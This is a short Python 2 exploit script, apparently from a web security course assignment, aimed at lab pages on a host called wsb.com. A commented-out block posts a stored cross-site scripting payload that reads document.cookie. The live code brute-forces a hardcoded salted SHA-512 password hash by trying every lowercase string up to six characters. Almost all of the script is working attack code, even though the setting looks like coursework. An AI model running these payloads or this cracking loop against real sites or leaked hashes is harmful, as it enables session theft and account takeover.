#sample exploit for sample case
# import urllib, urllib2, cookielib

# # do POST to the fworm
# url_2 = 'http://www.wsb.com/Assignment2/case19.php'
# # prepare the value of the form which includes the attack payload
# values = dict(title='EXPLOIT FOR CASE 19 <script>alert(document.cookie)</script>', content='Exploit... ' )
# data = urllib.urlencode(values)
# #submit the form
# req = urllib2.Request(url_2, data)
# rsp = urllib2.urlopen(req)
# #read the return result
# content = rsp.read()

# import webbrowser
# new = 2 #open in new window
# webbrowser.open(url_2,new=new)

import urllib, urllib2, cookielib,sys,os,random,hashlib
def checkpassword(password):
    url_2="http://www.wsb.com/Assignment2/case20/includes/process_login.php"
    salt='9614ba56553bd6a5707831ebed9395de81096571cbd1282b97a5755c21464072f4e890030ebd5111aef9e7cda18d4e75c503b28e0860d35e9bc3a45adc89e7dc'
    password_db='a6ab787fdace563008c45f14aa9d5da5e3c0ef41acfe76ec09212484ba641ee9fc228db69104d207ff32e4cdfd294be1300921143531977661bce7daef3b6433'
    passwordhash=hashlib.sha512(password).hexdigest()
    passwordhash2=hashlib.sha512(passwordhash+salt).hexdigest()
    if passwordhash2==password_db:
        print password
        exit()

wordstr='abcdefghijklmnopqrstuvwxyz'
wordlist=list(wordstr)
for a in wordlist:
    s1=a
    percent=(ord(a)-97.0)/(123-97)
    print percent
    checkpassword(s1)
    for b in wordlist:
        s2=s1+b
        print percent+(ord(b)-97.0)/(123-97)/26
        checkpassword(s2)
        for c in wordlist:
            s3=s2+c
            checkpassword(s3)
            for d in wordlist:
                s4=s3+d
                checkpassword(s4)
                for e in wordlist:
                    s5=s4+e
                    checkpassword(s5)
                    for f in wordlist:
                        s6=s5+f
                        checkpassword(s6)
